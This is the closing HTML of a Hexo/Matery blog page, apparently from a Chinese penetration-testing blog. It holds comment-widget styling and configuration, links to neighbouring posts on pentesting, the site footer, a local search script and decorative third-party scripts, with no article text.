        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/12/19/chang-jian-shen-tou-ce-shi-liu-cheng/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="常见渗透测试流程">
                        
                        <span class="card-title">常见渗透测试流程</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-12-19
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
                                    内网渗透
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/">
                        <span class="chip bg-color">红队渗透</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/12/14/pentesterlab-xi-lie/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="PentesterLab刷题记录">
                        
                        <span class="card-title">PentesterLab刷题记录</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-12-14
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/PentesterLab%E7%B3%BB%E5%88%97/" class="post-category">
                                    PentesterLab系列
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/web%E6%B8%97%E9%80%8F/">
                        <span class="chip bg-color">web渗透</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.js"></script>


<!-- 代码语言 -->


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4, h5, h6'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">861.1k</span>
            
            
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>



    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
        <i class="fab fa-facebook-f"></i>
    </a>





    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    
        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
